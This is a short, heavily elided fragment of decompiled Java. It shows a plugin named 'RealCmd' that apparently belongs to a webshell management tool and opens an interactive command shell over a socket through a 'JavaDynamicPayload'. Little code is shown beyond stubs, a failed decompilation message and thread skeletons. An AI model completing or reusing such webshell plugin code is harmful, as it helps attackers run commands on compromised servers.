...
@PluginAnnotation(Name = "JRealCmd", payloadName = "JavaDynamicPayload")
public class RealCmd implements Plugin {
    ...
    private void closePlugin() {
        /*
            ...
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: shells.plugins.java.RealCmd.closePlugin():void");
    }
        ...
        public runCmd(Socket socket, Payload payload, String execFile, JTextField pollingSleepTextField2) {
            try {
                ...
                new Thread(new Runnable(RealCmd.this) {
                    /* class shells.plugins.java.RealCmd.runCmd.AnonymousClass1 */
                ...
                Thread.sleep(5000);
                new Thread(new Runnable(RealCmd.this) {
                    /* class shells.plugins.java.RealCmd.runCmd.AnonymousClass2 */
